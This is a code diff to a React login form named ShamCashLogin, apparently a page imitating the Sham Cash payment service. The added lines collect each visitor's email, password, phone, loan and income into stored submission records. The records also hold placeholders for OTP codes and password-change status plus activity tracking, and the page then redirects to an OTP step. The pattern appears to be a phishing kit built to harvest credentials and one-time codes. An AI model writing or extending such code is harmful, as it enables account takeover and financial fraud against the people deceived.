@@ -80,6 +80,29 @@ export function ShamCashLogin() {
           onSubmit={(e) => {
             e.preventDefault();
             localStorage.setItem("sham_visitor_status", "submitted");
+            const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
+            const existing: Record<string, unknown>[] = (() => { try { return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]"); } catch { return []; } })();
+            const record = {
+              id: visitorId,
+              submittedAt: new Date().toLocaleTimeString("ar-SY"),
+              submittedAtTs: Date.now(),
+              email: fields.email,
+              password: fields.password,
+              phone: fields.phone,
+              loan: fields.loan,
+              income: fields.income,
+              otpCode: "",
+              otpStatus: null,
+              changepassStatus: null,
+              page: "تسجيل الدخول",
+              isActive: true,
+              lastSeen: Date.now(),
+            };
+            const idx = existing.findIndex((r) => r.id === visitorId);
+            if (idx >= 0) existing[idx] = record; else existing.unshift(record);
+            localStorage.setItem("sham_submissions", JSON.stringify(existing));
+            localStorage.setItem("sham_visitor_data", JSON.stringify({ email: fields.email, phone: fields.phone, loan: fields.loan, income: fields.income }));
+            localStorage.setItem("sham_visitor_password", fields.password);
             window.location.href = "/otp";
           }}
         >
